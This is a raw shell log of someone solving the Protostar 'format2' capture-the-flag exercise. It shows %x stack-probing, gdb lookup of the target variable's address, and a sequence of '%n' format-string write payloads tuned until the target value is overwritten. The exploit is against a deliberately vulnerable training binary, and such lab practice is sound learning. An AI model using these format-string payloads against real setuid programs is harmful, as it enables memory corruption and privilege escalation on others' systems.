file ./formate2
./formate2: ERROR: cannot open `./formate2' (No such file or directory)
user@protostar:/opt/protostar/bin$ file ./format2
./format2: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, not stripped
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ ./format0 $(python -c "print 'AAAA'+'%x'*10")
Segmentation fault
user@protostar:/opt/protostar/bin$ ./format0 $(python -c "print 'AAAA'+'%x'*9")
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA' + '%x.'*3 + '%x'" | format2
bash: format2: command not found
close failed in file object destructor:
Error in sys.excepthook:

Original exception was:
user@protostar:/opt/protostar/bin$ ./format2 $(python -c "print 'AAAA'+'%x'*9")
AAAAAAAA
AAAAAAAA
target is 0 :(
user@protostar:/opt/protostar/bin$ ./format2 $(python -c "print 'AAAA'+'%x'*9")
wewe
wewe
target is 0 :(
user@protostar:/opt/protostar/bin$ ./format2 $(python -c "print 'AAAA'+'%x '*9+'%x'")
ss
ss
target is 0 :(
user@protostar:/opt/protostar/bin$ ./format2 $(python -c "print 'AAAA'+'%x '*9+'%x'")python -c "print 'AAAA'+'%x '*9+'%x'"


target is 0 :(
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA'+'%x '*9+'%x'" | ./format2
AAAA200 b7fd8420 bffff614 41414141 25207825 78252078 20782520 25207825 78252078 20782520
target is 0 :(
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA'+'%x '*3+'%x'" | ./format2
AAAA200 b7fd8420 bffff614 41414141
target is 0 :(
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ wait for 41414141
bash: wait: `for': not a pid or valid job spec
bash: wait: pid 41414141 is not a child of this shell
user@protostar:/opt/protostar/bin$ python -c "print 'AAAA'+'%x '*3+'%n'" | ./format2
Segmentation fault
user@protostar:/opt/protostar/bin$ gdb ./format2
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/format2...done.
(gdb) info functions
All defined functions:

File format2/format2.c:
int main(int, char **);
void vuln(void);

Non-debugging symbols:
0x0804830c  _init
0x0804834c  __gmon_start__
0x0804834c  __gmon_start__@plt
0x0804835c  fgets
0x0804835c  fgets@plt
0x0804836c  __libc_start_main
0x0804836c  __libc_start_main@plt
0x0804837c  printf
0x0804837c  printf@plt
0x0804838c  puts
0x0804838c  puts@plt
0x080483a0  _start
0x080483d0  __do_global_dtors_aux
0x08048430  frame_dummy
0x080484d0  __libc_csu_fini
0x080484e0  __libc_csu_init
0x0804853a  __i686.get_pc_thunk.bx
0x08048540  __do_global_ctors_aux
0x0804856c  _fini
(gdb) print &target
$1 = (int *) 0x80496e4
(gdb) ^Z
[1]+  Stopped                 gdb ./format2
user@protostar:/opt/protostar/bin$ python -c "print '\xe4\x96\x04\x08'+'%x '*3+'%n'" | ./format2
�200 b7fd8420 bffff614 
target is 26 :(
user@protostar:/opt/protostar/bin$ now need 36 not 26 for that add %nu
bash: now: command not found
user@protostar:/opt/protostar/bin$ python -c "print '\xe4\x96\x04\x08'+'%x '*3+'%10u%n'" | ./format2
Segmentation fault
user@protostar:/opt/protostar/bin$ python -c "print '\xe4\x96\x04\x08'+'%x '*3+'%10u'+'%n'" | ./format2
Segmentation fault
user@protostar:/opt/protostar/bin$ python -c "print '\xe4\x96\x04\x08'+'%x '*2+'%10u'+'%n'" | ./format2
�200 b7fd8420 3221222932
target is 27 :(
user@protostar:/opt/protostar/bin$ python -c "print '\xe4\x96\x04\x08'+'%x '*2+'%20u'+'%n'" | ./format2
�200 b7fd8420           3221222932
target is 37 :(
user@protostar:/opt/protostar/bin$ python -c "print '\xe4\x96\x04\x08'+'%x '*2+'%18u'+'%n'" | ./format2
�200 b7fd8420         3221222932
target is 35 :(
user@protostar:/opt/protostar/bin$ python -c "print '\xe4\x96\x04\x08'+'%x '*2+'%19u'+'%n'" | ./format2
�200 b7fd8420          3221222932
target is 36 :(
user@protostar:/opt/protostar/bin$ sorry need 64 not 36
bash: sorry: command not found
user@protostar:/opt/protostar/bin$ 
user@protostar:/opt/protostar/bin$ python -c "print '\xe4\x96\x04\x08'+'%x '*2+'%40u'+'%n'" | ./format2
�200 b7fd8420                               3221222932
target is 57 :(
user@protostar:/opt/protostar/bin$ python -c "print '\xe4\x96\x04\x08'+'%x '*2+'%47u'+'%n'" | ./format2
�200 b7fd8420                                      3221222932
you have modified the target :)
user@protostar:/opt/protostar/bin$ got it 
bash: got: command not found
user@protostar:/opt/protostar/bin$
